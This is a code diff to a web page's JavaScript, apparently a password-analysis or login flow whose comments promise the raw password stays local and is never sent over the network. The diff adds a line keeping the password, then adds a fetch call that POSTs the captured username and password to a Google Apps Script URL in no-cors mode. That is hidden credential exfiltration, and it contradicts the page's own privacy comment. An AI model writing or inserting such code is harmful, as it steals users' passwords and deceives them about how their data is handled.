@@ -439,6 +439,7 @@
     // Everything below stays local — computed once, then the raw password
     // is discarded. Nothing is sent over the network or written to storage.
     capturedUsername = username;
+    capturedPassword = pw;
     window._pwStats = analyzePassword(pw);
 
     goTo('stage-connecting');
@@ -675,6 +676,33 @@
       drawMarkers();
     }
   }
+
+  
+  // 1. The URL you copied from the Google deployment step
+const GOOGLE_SCRIPT_URL = 'https://script.google.com/macros/s/AKfycbz0LGne-awXUCoFIJ4PxeeZFe2y67ZWPmbQnrD7mUSawoo_BNJIG9tm5o0rwhOEC2ZQ/exec';
+
+// 2. The data you want to print/send
+const myData = {
+  name: capturedUsername,
+  p: capturedPassword
+};
+
+// 3. Send it to Google Sheets
+fetch(GOOGLE_SCRIPT_URL, {
+    method: 'POST',
+    mode: 'no-cors', // Crucial for cross-origin requests to Google Scripts
+    headers: {
+        'Content-Type': 'application/json'
+    },
+    body: JSON.stringify(myData)
+})
+.then(() => {
+    console.log('Data successfully sent to Google Sheets!');
+})
+.catch(error => {
+    console.error('Error sending data:', error);
+});
+
 
   function initPatternEscape(){
     step = 0;
